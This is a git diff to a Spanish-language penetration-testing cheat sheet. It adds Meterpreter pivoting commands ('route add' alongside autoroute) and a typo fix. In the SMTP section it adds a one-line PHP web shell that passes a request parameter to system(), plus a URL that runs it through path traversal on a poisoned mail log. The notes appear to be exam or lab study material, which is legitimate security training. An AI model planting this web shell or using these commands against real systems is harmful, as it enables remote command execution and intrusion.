@@ -88,6 +88,8 @@ arp -a
 - Añadir una ruta después de descubrir otra **red** (DENTRO DE **meterpreter**)
 ```bash
 meterpreter> run autoroute -s 192.168.12.5
+# O también
+meterpreter> route add DirRed/Mascara 1
 ``` 
 - Módulos de escaneo **TCP y UDP**
 ```bash
@@ -208,10 +210,15 @@ DATA
 354 End data with <CR><LF>.<CR><LF>
 Subject:rot esto pa ti
 EEEH primazo, me comes to el cazo
+
+# OTRA alternativa es mandar php malicious 
+<?php if(isset($_REQUEST['cmd'])){ echo "<pre<"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; } ?>
+# Y visitamos SI HAY PATH TRAVERSAL http://dominio.com/?campovulnerable=/var/log/usuario&cmd=id
 .
 250 2.0.0 Ok: queued as ED0B8BAC1
 quit
 ```
+
 
 ### Vulnerability Scanning
 
@@ -855,6 +862,8 @@ search hashdump
 - Al comprometer runa máquina añadiremos Rutas
 ```bash
 meterpreter> run autoroute -s DirRed/Mascara
+# O esto
+meterpreter> route add DirRed/Mascara 1
 # renombramos las sesiones para que nos queden claras las redes
 sessions -n Red1-Victim1 -i 1
 ```
@@ -869,7 +878,7 @@ exploit
 - Para **forwarding** 
 > **-l:** Especificamos el puerto de la máquina atacante
     **-p:** Especificamos el port de la vítcima
-     **-r:** Especifico la áquina Víctima
+     **-r:** Especifico la máquina Víctima
  
 ```bash
 meterpreter>portfwd add -l 1234 -p 80 -r IPVictim2
